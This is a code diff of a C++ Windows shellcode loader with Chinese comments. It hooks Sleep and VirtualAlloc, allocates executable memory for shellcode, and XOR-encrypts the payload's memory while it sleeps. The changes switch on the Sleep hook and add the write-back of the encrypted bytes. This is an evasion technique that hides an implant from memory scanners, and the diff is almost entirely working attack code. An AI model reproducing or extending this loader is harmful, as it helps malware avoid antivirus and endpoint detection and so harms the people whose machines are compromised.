@@ -354,32 +354,36 @@ void SetStrToMem(std::string str, char* mem)
         mem++;
     }
 }
-void encrypt_memory(LPCVOID address_main, size_t size, unsigned char key) {
+void encrypt_memory(LPCVOID address_main1, size_t size, unsigned char key) {
     BYTE* memory_value = new BYTE[size];
-    ReadProcessMemory(GetCurrentProcess(), address_main, memory_value, size, NULL);  //获取全部内存
-    printf("address main is : %p",address_main);
+    ReadProcessMemory(GetCurrentProcess(), address_main1, memory_value, size, NULL);  //获取全部内存
+    printf("address main is : %p\n",address_main1);
+    //char* buffer = new char[size * 3];
     printf("\n---------origin---------\n");
-    for (int i = 0; i < size; i++)
+    //只输出前100个字节
+    for (int i = 0; i < 10; i++)
     {
         printf("%02X ", memory_value[i]);
     }
+    //printf("%s\n", buffer);
     for (size_t i = 0; i < size; i++) {
         memory_value[i] ^= key;
     }
+    WriteProcessMemory(GetCurrentProcess(), (LPVOID)address_main1, memory_value, size, NULL);
     printf("\n---------xor after---------\n");
-    for (int i = 0; i < size; i++)
+    for (int i = 0; i < 100; i++)
     {
         printf("%02X ", memory_value[i]);
     }
     printf("\n---------xor after---------\n");
  
 }
-void decrypt_memory(LPCVOID address_main, size_t size, unsigned char key) {
+void decrypt_memory(LPCVOID address_main1, size_t size, unsigned char key) {
     BYTE* memory_value = new BYTE[size];
-    ReadProcessMemory(GetCurrentProcess(), address_main, memory_value, size, NULL);  //获取全部内存
-    printf("address main is : %p", address_main);
+    ReadProcessMemory(GetCurrentProcess(), address_main1, memory_value, size, NULL);  //获取全部内存
+    printf("address main is : %p\n", address_main1);
     printf("\n---------xor after---------\n");
-    for (int i = 0; i < size; i++)
+    for (int i = 0; i < 10; i++)
     {
         printf("%02X ", memory_value[i]);
     }
@@ -387,7 +391,8 @@ void decrypt_memory(LPCVOID address_main, size_t size, unsigned char key) {
         memory_value[i] ^= key;
     }
     printf("\n--------origin----------\n");
-    for (int i = 0; i < size; i++)
+    WriteProcessMemory(GetCurrentProcess(), (LPVOID)address_main1, memory_value, size, NULL);
+    for (int i = 0; i < 100; i++)
     {
         printf("%02X ", memory_value[i]);
     }
@@ -402,7 +407,7 @@ LPVOID HookedVirtualAlloc(LPVOID lpAddress,SIZE_T dwSize,DWORD flAlloctionType,D
     LPVOID address = VirtualAlloc(lpAddress,dwSize,flAlloctionType,flProtect);
 
     printf("VirtialAlloc %08X %d %d %d %d \n", address, dwSize, flAlloctionType, flProtect);
-    hook_virtual_count += hook_virtual_count;
+    hook_virtual_count = hook_virtual_count+1;
     if (hook_virtual_count == 1) {
         address_jQuery = address;
         address_jQuery_size = dwSize;
@@ -466,6 +471,7 @@ VOID WINAPI HookedSleep(DWORD dwMilliseconds) {
     }*/
     PDWORD lpflOldProtect = NULL;
     // 加密新内存
+    printf("address main memory:%p\n", address_main);
     VirtualProtect(address_main, address_main_size, PAGE_READWRITE, lpflOldProtect);
     // 加密函数
     encrypt_memory(address_main, address_main_size, key);
@@ -592,7 +598,7 @@ int main(int argc, CHAR* argv[]) {
             SleepB sleepa = (SleepB)_getFunction_sleep(process_address, kernel32_address);
             printf("sleep address:%p\n", (LPVOID)sleepa);
             hookaddress_sleep = (LPVOID)sleepa;  //获取到sleep的地址
-            //HookSleep();
+            HookSleep();
             //Sleep(10000);
             printf("HookedVirtualAlloc is :%p\n", (DWORD_PTR)HookedVirtualAlloc);
             char* a = (char*)(*p)(NULL, str.length(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); //get a memory to save shellcode
